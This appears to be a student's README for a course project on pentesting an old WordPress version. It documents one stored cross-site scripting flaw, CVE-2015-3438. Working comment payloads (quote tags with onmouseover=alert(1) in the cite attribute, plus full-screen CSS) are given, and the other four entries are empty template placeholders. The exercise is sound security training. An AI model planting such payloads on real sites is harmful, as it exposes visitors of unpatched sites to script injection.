# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Un-auth XSS in Comment [CVE-2015-3438](https://nvd.nist.gov/vuln/detail/CVE-2015-3438)
  - Summary:
    - XSS
    - 4.1.1
    - 4.1.2
  - GIF Walkthrough:
  - Steps to recreate:

```
.ohno {
	display:block;
	position:fixed;
	width:100%;
	height:100%;
	top:0;
}
```

```
sometext
<blockquote cite='x onmouseover=alert(1) class=ohno 𝌆'>
```
```
xss
<q cite='x onmouseover=alert(1) style=display:block;position:fixed;width:100%;height:100%;top:0; 𝌆'>
```
  - Reference: [https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/]()


1. (Required) Vulnerability Name or ID
  - Summary:
    - Vulnerability types:
    - Tested in version:
    - Fixed in version:
  - GIF Walkthrough:
  - Steps to recreate:
  - Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Required) Vulnerability Name or ID
  - Summary:
    - Vulnerability types:
    - Tested in version:
    - Fixed in version:
  - GIF Walkthrough:
  - Steps to recreate:
  - Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - Summary:
    - Vulnerability types:
    - Tested in version:
    - Fixed in version:
  - GIF Walkthrough:
  - Steps to recreate:
  - Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - Summary:
    - Vulnerability types:
    - Tested in version:
    - Fixed in version:
  - GIF Walkthrough:
  - Steps to recreate:
  - Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
